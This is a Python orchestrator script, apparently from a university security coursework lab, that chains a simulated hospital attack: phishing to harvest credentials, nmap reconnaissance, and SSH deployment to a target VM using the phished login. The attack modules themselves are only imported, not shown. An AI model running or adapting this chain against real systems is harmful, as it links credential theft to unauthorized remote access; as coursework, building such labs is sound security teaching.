#!/usr/bin/env python3
"""Master orchestrator — runs all attack phases in sequence.

Usage:
    python3 run_attack.py <UBUNTU_VM_IP>

Example:
    python3 run_attack.py 192.168.64.3

The orchestrator chains phase results automatically:
  Phase 0  →  phishing email harvests credentials + creates local data
  Phase 1  →  nmap recon against target
  Phase 2  →  paramiko SSH deploy using phished creds
  Phase 3  →  (executes remotely inside containers via Phase 2)

All events are logged to attack_log.json via utils.logger.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from utils.logger import AttackLogger
from phases.phase0_phishing import Phase0Phishing
from phases.phase1_recon import Phase1Recon
from phases.phase2_deploy import Phase2Deploy


BANNER = r"""
 ╔══════════════════════════════════════════════════════════╗
 ║   SPGroup28 — Unified Hospital Attack                   ║
 ║   ELEC0138 Security & Privacy Coursework                ║
 ╚══════════════════════════════════════════════════════════╝
"""


def abort(msg: str, logger: AttackLogger):
    print(f"\n[ABORT] {msg}")
    logger.log("orchestrator", "abort", {"reason": msg}, success=False)
    sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print("Usage: python3 run_attack.py <UBUNTU_VM_IP>")
        sys.exit(1)

    target_ip = sys.argv[1]
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "attack_log.json")
    logger = AttackLogger(log_path)

    print(BANNER)
    logger.log("orchestrator", "attack_started", {"target_ip": target_ip})

    # ── Phase 0: Phishing (harvests credentials + seeds data) ──
    p0 = Phase0Phishing(logger)
    r0 = p0.run()
    if not r0["success"]:
        abort("Phase 0 failed", logger)

    phished_user = r0["harvested_user"]
    phished_pass = r0["harvested_password"]

    # ── Phase 1: Recon ────────────────────────────────────────
    p1 = Phase1Recon(target_ip, logger)
    r1 = p1.run()
    if not r1["success"]:
        abort("Phase 1 (recon) failed — no open ports found", logger)

    # ── Phase 2: Deploy (uses phished creds from Phase 0) ────
    p2 = Phase2Deploy(target_ip, phished_user, phished_pass, logger)
    r2 = p2.run()
    if not r2["success"]:
        abort("Phase 2 (deploy) failed", logger)

    # ── Done ──────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("  ATTACK COMPLETE")
    print("=" * 60)
    print(f"\n  Target IP  : {target_ip}")
    print(f"  Credentials: {phished_user} (phished)")
    print(f"  Log file   : {log_path}")
    print(f"  Events     : {len(logger.get_entries())}")
    print()

    logger.log("orchestrator", "attack_complete",
               {"total_events": len(logger.get_entries())})


if __name__ == "__main__":
    main()
